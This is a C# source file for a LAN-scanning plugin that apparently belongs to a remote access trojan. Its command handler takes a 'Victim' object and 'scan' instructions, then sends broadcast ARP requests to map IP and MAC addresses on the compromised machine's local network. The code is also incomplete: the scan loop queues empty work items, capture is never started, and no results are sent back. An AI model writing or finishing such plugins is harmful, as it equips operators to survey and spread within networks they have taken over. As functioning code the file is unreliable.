using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using PacketDotNet;
using SharpPcap;

using winClient48;

namespace clsLAN
{
    /// <summary>
    /// Remote plugin.
    /// 
    /// </summary>
    public class clsLAN : IRemotePlugin
    {
        public string szName => "LANScanner";
        public string szVersion => "1.0.0";
        public string szDescription => "LAN Scanner";

        private struct stHostInfo
        {
            public string szIPv4 { get; set; }
            public string szMAC { get; set; }

            public stHostInfo(string szIPv4, string szMAC)
            {
                this.szIPv4 = szIPv4;
                this.szMAC = szMAC;
            }
        }

        public struct stDeviceInfo
        {
            public string szDescription { get; set; }
            public string szIPv4Address { get; set; }
            public IPAddress IPv4Mask { get; set; }
            public ILiveDevice device { get; set; }
            public NetworkInterface networkInterface { get; set; }
            public IPAddress GatewayAddress { get; set; }

            public stDeviceInfo(
                string szDescription,
                string szIPv4Address,
                IPAddress IPv4Mask,
                ILiveDevice device,
                NetworkInterface networkInterface,
                IPAddress GatewayAddress
            )
            {
                this.szDescription = szDescription;
                this.szIPv4Address = szIPv4Address;
                this.IPv4Mask = IPv4Mask;
                this.device = device;
                this.networkInterface = networkInterface;
                this.GatewayAddress = GatewayAddress;
            }
        }

        private List<stDeviceInfo> m_lsDevice = new List<stDeviceInfo>();
        private Dictionary<string, stHostInfo> m_dicHost = new Dictionary<string, stHostInfo>();

        public clsLAN()
        {
            
        }

        public void Initialize()
        {
            m_lsDevice.Clear();

            var lsDevice = CaptureDeviceList.Instance.ToList();
            foreach (var device in lsDevice)
            {
                stDeviceInfo info = fnGetDeviceInfo(device);
                m_lsDevice.Add(info);
            }
        }

        public void fnRun(Victim v, List<string> lsMsg)
        {
            if (lsMsg[0] == "init")
            {

            }
            else if (lsMsg[0] == "scan")
            {
                IPAddress ipStart;
                IPAddress ipEnd;

                if (lsMsg[1] == "CIDR")
                {
                    var tuple = fnCIDR2IpRange(lsMsg[2]);
                    ipStart = tuple.Item1;
                    ipEnd = tuple.Item2;
                }
                else
                {
                    ipStart = IPAddress.Parse(lsMsg[2]);
                    ipEnd = IPAddress.Parse(lsMsg[3]);
                }

                fnSendArpWithIpRange(ipStart, ipEnd, 10);
            }
        }

        private stDeviceInfo fnGetDeviceInfo(ILiveDevice device)
        {
            string szIPv4Addr = null;
            NetworkInterface netIf = null;
            IPAddress maskAddr = null;
            IPAddress gatewayAddr = null;

            var lsNetworkInterface = NetworkInterface.GetAllNetworkInterfaces().ToList();

            foreach (var netif in lsNetworkInterface)
            {
                if (netif.Description == device.Description)
                {
                    var ipProperties = netif.GetIPProperties();
                    UnicastIPAddressInformationCollection coll = ipProperties.UnicastAddresses;
                    foreach (var ip in coll)
                    {
                        if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        {
                            szIPv4Addr = ip.Address.ToString();
                            netIf = netif;
                            maskAddr = ip.IPv4Mask;
                            break;
                        }
                    }

                    foreach (var ip in ipProperties.GatewayAddresses)
                    {
                        if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        {
                            gatewayAddr = ip.Address;
                            break;
                        }
                    }
                }
            }

            stDeviceInfo info = new stDeviceInfo(device.Description, szIPv4Addr, maskAddr, device, netIf, gatewayAddr);

            return info;
        }

        uint fnIPToUInt32(IPAddress ip)
        {
            byte[] abBuffer = ip.GetAddressBytes();
            Array.Reverse(abBuffer); //Get Big-Endian

            return BitConverter.ToUInt32(abBuffer, 0);
        }

        IPAddress fnUInt32ToIP(uint uIP)
        {
            byte[] abBuffer = BitConverter.GetBytes(uIP);
            Array.Reverse(abBuffer); //Get Little-Endian

            return new IPAddress(abBuffer);
        }

        Tuple<IPAddress, IPAddress> fnCIDR2IpRange(string szCIDR)
        {
            string[] aPart = szCIDR.Split('/');
            string ipAddr = aPart[0];
            int nSubnetMaskLength = int.Parse(aPart[1]);

            uint uIpAddr = fnIPToUInt32(IPAddress.Parse(ipAddr));
            uint uSubnetMask = uint.MaxValue << (32 - nSubnetMaskLength);

            uint netAddr = uIpAddr & uSubnetMask;
            uint boardcastAddr = netAddr | ~uSubnetMask;

            IPAddress ipStart = fnUInt32ToIP(netAddr);
            IPAddress ipEnd = fnUInt32ToIP(boardcastAddr);

            return Tuple.Create(ipStart, ipEnd);
        }

        private uint fnSubnetMaskToCIDR(string szSubnetMask)
        {
            byte[] abMask = IPAddress.Parse(szSubnetMask).GetAddressBytes();
            uint CIDR = 0;

            foreach (byte b in abMask)
            {
                for (int i = 7; i >= 0; i--)
                {
                    if ((b & (1 << i)) != 0)
                        CIDR++;
                }
            }

            return CIDR;
        }

        void fnStartCapture()
        {
            foreach (var deviceInfo in m_lsDevice)
            {
                try
                {
                    var device = deviceInfo.device;
                    device.OnPacketArrival += fnDeviceARP_OnPacketArrival;
                    device.OnPacketArrival += fnDeviceICMP_OnPacketArrival;

                    device.Open();
                    device.StartCapture();
                }
                catch
                {

                }
            }
        }

        void fnStopCapture()
        {
            foreach (var deviceInfo in m_lsDevice)
            {
                try
                {
                    var device = deviceInfo.device;
                    device.StopCapture();
                    device.Close();
                }
                catch
                {

                }
            }
        }

        void fnSendArpWithIpRange(IPAddress ipStart, IPAddress ipEnd, int nThreadCount)
        {
            uint uIpStart = fnIPToUInt32(ipStart);
            uint uIpEnd = fnIPToUInt32(ipEnd);

            if (uIpStart > uIpEnd)
                return;

            ThreadPool.SetMinThreads(1, 1);
            ThreadPool.SetMaxThreads(nThreadCount, nThreadCount);
            for (uint i = uIpStart; i <= uIpEnd; i++)
            {
                IPAddress ipTarget = fnUInt32ToIP(i);
                ThreadPool.QueueUserWorkItem(x =>
                {

                });
            }
        }

        void fnSendArpRequest(string szTargetIPv4) => fnSendArpRequest(IPAddress.Parse(szTargetIPv4));
        void fnSendArpRequest(IPAddress ipTarget)
        {
            foreach (var deviceInfo in m_lsDevice)
            {
                fnSendArpRequest(ipTarget, deviceInfo);
            }
        }

        void fnSendArpRequest(IPAddress ipTarget, stDeviceInfo deviceInfo)
        {
            PhysicalAddress srcMAC = deviceInfo.device.MacAddress;
            IPAddress srcIP = IPAddress.Parse(deviceInfo.szIPv4Address);
            IPAddress dstIP = ipTarget;

            var pktEthernet = new EthernetPacket(srcMAC, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"), EthernetType.Arp);
            var pktARP = new ArpPacket(ArpOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), dstIP, srcMAC, srcIP);

            pktEthernet.PayloadPacket = pktARP;

            deviceInfo.device.SendPacket(pktEthernet);
        }

        void fnDeviceARP_OnPacketArrival(object sender, PacketCapture e)
        {
            var pktRAW = e.GetPacket();
            var pkt = Packet.ParsePacket(pktRAW.LinkLayerType, pktRAW.Data);
            var pktARP = pkt.Extract<ArpPacket>();

            if (pktARP == null)
                return;

            if (pktARP.Operation == ArpOperation.Response)
            {
                string szIP = pktARP.SenderProtocolAddress.ToString();
                string szMAC = pktARP.SenderHardwareAddress.ToString();

                if (!m_dicHost.ContainsKey(szIP))
                    m_dicHost.Add(szIP, new stHostInfo(szIP, szMAC));
            }
        }

        void fnDeviceICMP_OnPacketArrival(object sender, PacketCapture e)
        {
            var pktRAW = e.GetPacket();
            var pkt = Packet.ParsePacket(pktRAW.LinkLayerType, pktRAW.Data);
            var pktICMP = pkt.Extract<IcmpV4Packet>();

            if (pktICMP == null) 
                return;

            if (pktICMP.TypeCode == IcmpV4TypeCode.EchoReply)
            {
                var pktIPv4 = pkt.Extract<IPv4Packet>();
                var pktEthernet = pkt.Extract<EthernetPacket>();

                string szIP = pktIPv4.SourceAddress.ToString();
                string szMAC = pktEthernet.SourceHardwareAddress.ToString();

                if (!m_dicHost.ContainsKey(szIP))
                    m_dicHost.Add(szIP, new stHostInfo(szIP, szMAC));
            }
        }
    }
}
